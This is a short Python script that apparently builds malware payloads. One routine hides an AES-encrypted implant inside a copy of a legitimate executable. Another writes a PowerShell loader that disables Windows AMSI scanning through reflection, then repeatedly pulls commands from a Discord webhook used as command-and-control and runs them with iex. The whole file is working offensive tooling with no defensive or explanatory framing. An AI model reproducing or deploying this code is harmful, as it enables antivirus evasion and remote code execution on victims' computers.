import os
import random
import pefile
from Crypto.Cipher import AES

class PayloadGenerator:
    def __init__(self):
        self.key = os.urandom(32)  # AES-256 Key
    
    def generate_exe(self, output_file):
        # Template from a legitimate executable
        with open("legit.exe", "rb") as f:
            data = f.read()
        
        # Append encrypted payload
        cipher = AES.new(self.key, AES.MODE_EAX)
        payload = open("implant.bin", "rb").read()
        ciphertext, tag = cipher.encrypt_and_digest(payload)
        
        with open(output_file, "wb") as f:
            f.write(data + cipher.nonce + tag + ciphertext)
        
        print(f"[+] Payload saved as {output_file}")

    def generate_ps1(self, output_file):
        # Obfuscated PowerShell loader
        script = """
        # AMSI Bypass
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
        $d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
        $g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
        
        # Discord C2
        while($true){
            try {
                $r = Invoke-WebRequest -Uri "https://discord.com/api/webhooks/YOUR_WEBHOOK" -UseBasicParsing;
                iex ($r.Content);
            } catch { Start-Sleep -Seconds 10 }
        }
        """
        with open(output_file, "w") as f:
            f.write(script)